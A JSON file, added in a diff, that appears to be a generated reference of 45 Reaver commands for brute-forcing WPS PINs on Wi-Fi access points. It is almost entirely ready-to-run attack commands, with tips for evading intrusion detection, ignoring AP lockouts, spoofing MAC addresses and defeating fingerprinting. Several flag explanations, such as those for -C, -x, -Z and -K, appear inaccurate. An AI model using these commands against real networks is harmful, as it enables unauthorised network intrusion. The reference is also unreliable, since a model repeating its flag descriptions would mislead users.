@@ -1,0 +1,322 @@
+{
+    "tool": "reaver",
+    "description": "Complete Reaver command and workflow reference from basic to advanced WPS security auditing",
+    "total_commands": 45,
+    "commands": [
+        {
+            "id": 1,
+            "category": "Basic Syntax",
+            "command": "reaver --help",
+            "example": "reaver --help",
+            "explanation": "Displays the full list of available command line options and arguments"
+        },
+        {
+            "id": 2,
+            "category": "Basic WPS Attack",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55",
+            "explanation": "Initiates a standard WPS PIN attack against a specific BSSID using the specified interface"
+        },
+        {
+            "id": 3,
+            "category": "Target Specification",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -e 'CorpWifi'",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -e 'CorpWifi'",
+            "explanation": "Targets a specific BSSID and verifies the ESSID matches before attacking to prevent errors"
+        },
+        {
+            "id": 4,
+            "category": "Channel Control",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6",
+            "explanation": "Locks the interface to channel 6 to improve stability and prevent channel hopping during the attack"
+        },
+        {
+            "id": 5,
+            "category": "Output and Logging",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -v",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -v",
+            "explanation": "Enables verbose output to display the current PIN being attempted and basic status updates"
+        },
+        {
+            "id": 6,
+            "category": "Output and Logging",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -vv",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -vv",
+            "explanation": "Enables very verbose output to show full debug information including M1-M7 message exchanges"
+        },
+        {
+            "id": 7,
+            "category": "Association Control",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -A",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -A",
+            "explanation": "Disables automatic association allows use when already associated via another tool"
+        },
+        {
+            "id": 8,
+            "category": "Timing Control",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -d 5",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -d 5",
+            "explanation": "Sets a 5-second delay between PIN attempts to evade basic intrusion detection systems"
+        },
+        {
+            "id": 9,
+            "category": "Timing Control",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -d 0",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -d 0",
+            "explanation": "Removes the delay between PIN attempts for maximum speed in a controlled lab environment"
+        },
+        {
+            "id": 10,
+            "category": "Lockout Handling",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -L",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -L",
+            "explanation": "Ignores the WPS locked state reported by the AP and attempts to proceed with the attack"
+        },
+        {
+            "id": 11,
+            "category": "Lockout Handling",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -N",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -N",
+            "explanation": "Does not send NACK messages when out of order packets are received to prevent AP lockouts"
+        },
+        {
+            "id": 12,
+            "category": "Pixie Dust",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -K 1",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -K 1",
+            "explanation": "Initiates a Pixie Dust attack using the wpa_supplicant-based approach to recover the PIN offline"
+        },
+        {
+            "id": 13,
+            "category": "Manual PIN Testing",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -p 12345670",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -p 12345670",
+            "explanation": "Attempts to validate a single specific PIN against the target access point"
+        },
+        {
+            "id": 14,
+            "category": "Manual PIN Testing",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -p 1234",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -p 1234",
+            "explanation": "Attempts a partial PIN to test if the AP reveals the first half validity without full checksum"
+        },
+        {
+            "id": 15,
+            "category": "Session Management",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -s session.wps",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -s session.wps",
+            "explanation": "Saves or restores the attack session from a specific file to allow pausing and resuming"
+        },
+        {
+            "id": 16,
+            "category": "Advanced Rate Limiting",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -l 60",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -l 60",
+            "explanation": "Forces a 60-second lockout period if the AP enters a locked state"
+        },
+        {
+            "id": 17,
+            "category": "Advanced Rate Limiting",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -r 3:60",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -r 3:60",
+            "explanation": "Sleeps for 60 seconds after every 3 consecutive PIN attempts to bypass rate limiting"
+        },
+        {
+            "id": 18,
+            "category": "Timeout Handling",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -t 10",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -t 10",
+            "explanation": "Sets the receive timeout period to 10 seconds to handle slow-responding access points"
+        },
+        {
+            "id": 19,
+            "category": "Timeout Handling",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -T 2",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -T 2",
+            "explanation": "Sets the M5/M7 message timeout to 2 seconds to speed up failure detection on bad PINs"
+        },
+        {
+            "id": 20,
+            "category": "Packet Manipulation",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -S",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -S",
+            "explanation": "Uses small Diffie-Hellman keys to reduce CPU load on the testing device"
+        },
+        {
+            "id": 21,
+            "category": "Packet Manipulation",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -m 00:11:22:33:44:66",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -m 00:11:22:33:44:66",
+            "explanation": "Spoofs the source MAC address of the attacking interface to bypass MAC filtering"
+        },
+        {
+            "id": 22,
+            "category": "Packet Manipulation",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -E",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -E",
+            "explanation": "Uses the EAP-FAIL mechanism to terminate sessions cleanly"
+        },
+        {
+            "id": 23,
+            "category": "Detection Evasion",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -x 20",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -x 20",
+            "explanation": "Sets the timeout for WPS identity packets to 20 seconds to match specific AP behaviors"
+        },
+        {
+            "id": 24,
+            "category": "Signal Handling",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -f",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -f",
+            "explanation": "Disables channel hopping entirely even if the AP is not found on the locked channel"
+        },
+        {
+            "id": 25,
+            "category": "Logging Workflow",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -o /tmp/reaver_audit.log",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -o /tmp/reaver_audit.log",
+            "explanation": "Writes all output to a specified log file for evidence collection and audit trails"
+        },
+        {
+            "id": 26,
+            "category": "Output Formatting",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -q",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -q",
+            "explanation": "Runs in quiet mode printing only the recovered passphrase and critical errors"
+        },
+        {
+            "id": 27,
+            "category": "Advanced Workflow",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -vv -L -N -d 10 -T .5",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -vv -L -N -d 10 -T .5",
+            "explanation": "Combines lock ignoring, no-NACKs, and delays for stubborn older access points"
+        },
+        {
+            "id": 28,
+            "category": "Advanced Workflow",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 11 -K 1 -vv",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 11 -K 1 -vv",
+            "explanation": "Executes a verbose Pixie Dust attack on channel 11 to quickly identify vulnerable chipsets"
+        },
+        {
+            "id": 29,
+            "category": "Red Team Simulation",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -S -N -vv -r 2:120",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -S -N -vv -r 2:120",
+            "explanation": "Simulates a low-and-slow attack attempting only 2 PINs every 2 minutes to test detection thresholds"
+        },
+        {
+            "id": 30,
+            "category": "Blue Team Validation",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -p 00000000 -vv",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -p 00000000 -vv",
+            "explanation": "Tests if the AP is vulnerable to default empty or zeroed PINs commonly found in factory settings"
+        },
+        {
+            "id": 31,
+            "category": "Blue Team Validation",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -p 12345670 -vv",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -p 12345670 -vv",
+            "explanation": "Validates if the AP correctly implements lockout after failed attempts using a known invalid PIN"
+        },
+        {
+            "id": 32,
+            "category": "Purple Team Testing",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -d 0 -vv",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -d 0 -vv",
+            "explanation": "Generates a noisy flood of PIN attempts to verify if the SIEM or WIPS triggers an alert"
+        },
+        {
+            "id": 33,
+            "category": "Compatibility Mode",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 --dh-small",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 --dh-small",
+            "explanation": "Alternative syntax for small DH keys ensuring compatibility with specific constrained AP hardware"
+        },
+        {
+            "id": 34,
+            "category": "Pin Enumeration",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -g 1",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -g 1",
+            "explanation": "Stops the attack after 1 attempt usually combined with scripts to distribute attacks across multiple nodes"
+        },
+        {
+            "id": 35,
+            "category": "Fail-Safe Operation",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -w",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -w",
+            "explanation": "Mimics Windows 7 registrar behavior to interact with APs that block standard Reaver signatures"
+        },
+        {
+            "id": 36,
+            "category": "Recovery Workflow",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -s old_session.wps",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -s old_session.wps",
+            "explanation": "Restores a previous attack state from a specific session file to continue where it left off"
+        },
+        {
+            "id": 37,
+            "category": "Maximum Verbosity",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -C",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -C",
+            "explanation": "Runs with verbose output and ignores FCS errors to debug weak signal issues"
+        },
+        {
+            "id": 38,
+            "category": "Manual MAC Spoofing",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 --mac=00:11:22:33:44:66",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 --mac=00:11:22:33:44:66",
+            "explanation": "Explicitly sets the source MAC address for the WPS exchange transaction"
+        },
+        {
+            "id": 39,
+            "category": "Packet Rate Control",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 --win7",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 --win7",
+            "explanation": "Alias for -w mimicking Windows 7 behavior to bypass simple OS fingerprinting on APs"
+        },
+        {
+            "id": 40,
+            "category": "Advanced Delay",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 --lock-delay=120",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 --lock-delay=120",
+            "explanation": "Sets a custom 120-second wait time specifically when the AP reports a WPS locked state"
+        },
+        {
+            "id": 41,
+            "category": "Full Automation Chain",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -vv -L -N -w -S -d 15 -r 3:120",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -vv -L -N -w -S -d 15 -r 3:120",
+            "explanation": "Complex chain for highly secured APs combining evasion spoofing and extreme rate limiting"
+        },
+        {
+            "id": 42,
+            "category": "Quick Audit",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -K 1",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -K 1",
+            "explanation": "Perform a rapid Pixie Dust check on channel 1 without verbose output for quick triage"
+        },
+        {
+            "id": 43,
+            "category": "Pin Recovery",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -p ''",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -p ''",
+            "explanation": "Attempts to interact with the AP using an empty PIN string to test for null-pin vulnerabilities"
+        },
+        {
+            "id": 44,
+            "category": "Infrastructure Testing",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -Z",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -Z",
+            "explanation": "Auto-detects the best rate limiting strategy based on the AP's response patterns"
+        },
+        {
+            "id": 45,
+            "category": "Verification",
+            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -n",
+            "example": "reaver -i wlan0mon -b 00:11:22:33:44:55 -n",
+            "explanation": "Target the AP but do not actually send any PINs used for connectivity verification only"
+        }
+    ]
+}
